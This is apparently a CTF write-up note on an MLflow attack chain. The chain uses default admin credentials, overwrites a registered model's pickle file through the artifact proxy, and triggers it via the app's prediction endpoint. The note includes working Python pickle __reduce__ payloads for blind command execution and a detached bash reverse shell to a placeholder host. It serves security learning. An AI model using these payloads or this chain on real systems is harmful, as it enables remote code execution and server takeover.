# MLflow Model Registry: Default Creds + Artifact-Proxy Write Is a Full RCE Chain

A recurring shape on "AI hiring platform" / "ML ops" themed boxes: the app
itself never touches attacker bytes directly (uploads get decoded as text,
CSV columns get cast with plain `int()`), but underneath it sits a real
**MLflow** tracking server + model registry, and MLflow's own artifact
store is a write-capable, code-execution-by-design surface the moment it's
reachable by an untrusted principal.

## The chain

1. **Find the tracking server.** It's usually not on the same vhost as the
   app. Fuzz `Host:` headers beyond the obvious `api./admin./app.`
   prefixes — try theme words too: `mlflow.`, `tracking.`, `ml.`,
   `registry.`, `models.`. MLflow's basic-auth plugin returns a
   distinctive 401 (`WWW-Authenticate: Basic realm="mlflow"`, body
   pointing at `mlflow.org/docs/.../auth`) that's an unambiguous fingerprint
   even before authenticating.
2. **Try the documented default admin credentials first, not a wordlist.**
   MLflow's `basic-auth` plugin creates an `admin` / `password` account on
   first server start — [documented behavior](https://mlflow.org/docs/latest/self-hosting/security/basic-http-auth/),
   not something operators are forced to rotate. Confirm with a read-only
   call (`POST /api/2.0/mlflow/experiments/search`) before doing anything
   destructive.
3. **Confirm the registered model uses the `pyfunc` custom-model flavor.**
   Pull the `MLmodel` YAML file for the run backing whatever model the app
   serves (`GET /api/2.0/mlflow-artifacts/artifacts/<run>/artifacts/model/MLmodel`).
   `loader_module: mlflow.pyfunc.model` + a `python_model: <name>.pkl` key
   means the "model" is a raw (cloud)pickled Python object graph — [MLflow's
   own custom-pyfunc tutorial](https://mlflow.org/docs/latest/ml/traditional-ml/tutorials/creating-custom-pyfunc/)
   documents this design directly: a custom pyfunc model *is* arbitrary
   code, reconstructed via `cloudpickle.load()` (a functional superset of
   `pickle.load()` for `__reduce__` purposes) the moment
   `mlflow.pyfunc.load_model()` touches it.
4. **Test the artifact-proxy write path.** MLflow's REST artifact proxy
   exposes list/download/**upload** (`PUT`) on the same auth as everything
   else, with **no per-tenant isolation** — any authenticated caller can
   overwrite any run's artifacts, including `python_model.pkl` backing an
   already-registered, already-in-production model version. This holds even
   with a fully rotated, strong admin password: MLflow's registry has no
   concept of "model owner may only write their own artifacts." A
   multi-tenant "one model per company" UI is cosmetic unless enforced by a
   layer MLflow itself doesn't provide.
5. **Overwrite `python_model.pkl` with a `__reduce__` payload, then trigger
   a load through the app's own authenticated path** (whatever calls
   `mlflow.pyfunc.load_model()` for that model — a prediction/scoring
   endpoint, typically). Code runs as the app's own worker process.

## Two payload tricks worth keeping in the toolbox

- **Blind exec-and-exfil before committing to a reverse shell.** If the
  app has a broad `except Exception` handler that echoes the exception
  message back as JSON (common in "friendly error" API design), raise the
  target command's own `subprocess.check_output()` result as the exception
  text instead of building a shell:
  ```python
  class Evil:
      def __reduce__(self):
          return (exec, ("import subprocess; raise Exception(subprocess.check_output('id', shell=True, stderr=subprocess.STDOUT))",))
  ```
  One HTTP request = one command execution with output round-tripped
  inline, no listener, no outbound egress required at all — useful for
  confirming impact and doing quick recon before spending effort on a full
  shell.
- **Detach the reverse shell so the triggering HTTP request doesn't hang.**
  A naive `os.system('bash -i >& /dev/tcp/... 0>&1')` inside `__reduce__`
  blocks the worker thread on the outbound TCP connect — the HTTP request
  (and often the whole worker) stalls until the connection resolves.
  Launch it detached instead:
  ```python
  subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"],
                    start_new_session=True, stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  raise Exception("shell-launch-attempted")
  ```
  `exec()`/`raise` returns immediately regardless of whether the TCP
  connect has completed yet.

## Why there's no "patch" to reference here

This isn't a version-specific CVE. MLflow's own documentation is explicit
that the tracking server and model registry must never be exposed to
untrusted principals, precisely because a custom pyfunc model is a full
code-execution primitive by construction. The actual bug on any box that
has this shape is a **deployment/trust-boundary mistake**: exposing the
tracking server's write-capable REST API externally (even behind a
separate, easy-to-miss vhost), gated by nothing stronger than the
framework's own un-rotated default password.

## Seen on

- [[smarthire#Foothold|SmartHire]] — RCE as the app's own service account
  (`svcweb`) via `admin`/`password` default MLflow creds on a separate
  `models.<host>` vhost, an artifact-proxy `PUT` overwriting a registered
  model's `python_model.pkl`, triggered through the app's own authenticated
  `/predict` endpoint. See also [[insecure-ml-pickle-deserialization]] for
  the broader "ML pipeline auto-loads untrusted pickle bytes" pattern this
  is one specific, registry-mediated instance of.
